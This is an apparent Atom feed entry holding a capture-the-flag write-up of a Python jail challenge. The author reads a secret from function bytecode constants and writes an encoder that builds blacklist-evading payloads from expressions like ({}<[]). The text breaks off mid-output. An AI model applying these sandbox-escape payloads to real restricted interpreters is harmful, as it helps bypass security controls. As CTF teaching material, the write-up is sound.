<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="/atom.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2018-08-20T06:08:16+02:00</updated><id>/</id><title type="html">Pxmme</title><subtitle>Cybersec enthusiast.</subtitle><author><name>Pxmme</name></author><entry><title type="html">TJCTF - Mirror Mirror</title><link href="/2018/08/12/TJCTF-Write-Up-Mirror-Mirror/" rel="alternate" type="text/html" title="TJCTF - Mirror Mirror" /><published>2018-08-12T02:00:05+02:00</published><updated>2018-08-12T02:00:05+02:00</updated><id>/2018/08/12/TJCTF-Write-Up-Mirror-Mirror</id><content type="html" xml:base="/2018/08/12/TJCTF-Write-Up-Mirror-Mirror/">&lt;!-- more --&gt;

&lt;h2 id=&quot;challenge&quot;&gt;Challenge&lt;/h2&gt;

&lt;p&gt;If you look closely, you can see a reflection.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nc problem1.tjctf.org 8004&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;[100 points]&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Written by Alaska47&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;initial-thoughts&quot;&gt;Initial thoughts&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc problem1.tjctf.org 8004
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
&amp;gt;&amp;gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;…&lt;/p&gt;

&lt;p&gt;To be really honest here, this was my first pyjail. Ever. I had never heard of this kind of challenge before. I knew about “bash jail” or whatever ; but didn’t know it was a thing.&lt;/p&gt;

&lt;p&gt;Took me a lot of googling, trying stupid shit like “python console exploit” or “python console enum”, and I couldn’t find nothing. Hopefully, a good man called &lt;a href=&quot;https://twitter.com/highsenburger69&quot;&gt;Highsenburger69&lt;/a&gt; told me “it’s a &lt;strong&gt;pyjail&lt;/strong&gt;” and sent me &lt;a href=&quot;http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/&quot;&gt;this link&lt;/a&gt;. Game on.&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;At first, I needed to do a little bit of enumeration. I started by trying random crap.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc problem1.tjctf.org 8004
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
&amp;gt;&amp;gt;&amp;gt; get_flag(&quot;flag&quot;)
f is not a valid character
&amp;gt;&amp;gt;&amp;gt; get_flag(&quot;()&quot;)
You didn't guess the value of my super_secret_string
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Uh. So apparently, some characters aren’t allowed. Most likely, letters and numbers. Aaaaaand there seems to be a “super secret string” that should give me the flag.&lt;/p&gt;

&lt;p&gt;Using some commands, I then managed to find something interesting :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc problem1.tjctf.org 8004
Hi! Are you looking for the flag? Try get_flag() for free flags. Remember, wrap your input in double quotes. Good luck!
&amp;gt;&amp;gt;&amp;gt; dir
&amp;lt;built-in function dir&amp;gt;
&amp;gt;&amp;gt;&amp;gt; dir(get_flag)
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
&amp;gt;&amp;gt;&amp;gt; dir(get_flag.func_code)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
&amp;gt;&amp;gt;&amp;gt; get_flag.func_code
&amp;lt;code object get_flag at 0x7f9f8fc644b0, file &quot;/home/app/problem.py&quot;, line 15&amp;gt;
&amp;gt;&amp;gt;&amp;gt; get_flag.func_code.co_consts
(None, 'this_is_the_super_secret_string', 48, 57, 65, 90, 97, 122, 44, 95, ' is not a valid character', '%\xcb', &quot;You didn't guess the value of my super_secret_string&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Yey! I got it! Pretty easy for that much points. Anyway, the value of the super secret string is : &lt;code class=&quot;highlighter-rouge&quot;&gt;this_is_the_super_secret_string&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Let’s type it in and get our flag!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; get_flag(&quot;this_is_the_super_secret_string&quot;)
Sorry, that's not allowed.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Fuck me. I forgot some characters aren’t allowed. If you look at the previous snippet, you’ll see, next to the super secret string value, some numbers : 48, 57, 65, 90, 97, 122, 44, 95. Ascii codes for 0-9, A-Z, a-z, “,”-“_”. Those must be the forbidden characters.&lt;/p&gt;

&lt;p&gt;That’s where &lt;a href=&quot;http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/&quot;&gt;Highsenburger69’s link&lt;/a&gt; comes in handy. I can see that &lt;a href=&quot;https://twitter.com/wapiflapi/&quot;&gt;Wapiflapi&lt;/a&gt; managed to generate letters and numbers using special chars, abusing logical relations between True and False values.&lt;/p&gt;

&lt;p&gt;The interesting part was this :&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table style=&quot;border-spacing: 0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot; style=&quot;text-align: right&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;~({}&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~([]&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;s&quot;&gt;&quot;([]&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;({}&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&amp;lt;&amp;lt;({}&amp;lt;[]))&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Seems amazing, kind of magic, but works! He even put an example a little below, so I tried it to understand exactly what was going on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Python 2.7.14+ (default, Mar 13 2018, 15:23:44) 
[GCC 7.3.0] on linux2
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&amp;gt;&amp;gt;&amp;gt; `[`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((~(~(~(~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(((~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~(~((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~(~(~((~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~(~((~(~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~((~((~((~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(~((((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))),`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%((~(((~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[])))]`[(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))::~(~(({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))]
'The game is on.'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Holy cow, that’s impressive!&lt;/p&gt;

&lt;p&gt;I noticed that he used “,” to separate each character in his code, and kept in mind for later that I would have to use “+” instead because “,” was forbidden in this challenge.&lt;/p&gt;

&lt;p&gt;I then started to write my own code, with one goal in mind : being able to reproduce what he was doing, using part of his code, to recreate my very much needed super secret key.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table style=&quot;border-spacing: 0&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot; style=&quot;text-align: right&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;~({}&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~([]&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;s&quot;&gt;&quot;([]&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&quot;({}&amp;lt;[])&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;~&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;(&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&amp;lt;&amp;lt;({}&amp;lt;[]))&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nb&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;addendum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;`'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addendum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brainfuckize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;+&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is actually a very simple piece of code once you understand it right. I’m slicing the last “+” at the end before printing, for those of you who wondered.&lt;/p&gt;

&lt;p&gt;Let’s try it out!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python func.py &quot;Am I good to go?&quot;
`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%~(~(~((~(~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))]%(((((({}&amp;lt;[])&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))&amp;lt;&amp;lt;({}&amp;lt;[]))+`'%\xcb'`[{}&amp;lt;[]::~(~({}&amp;lt;[])&amp;lt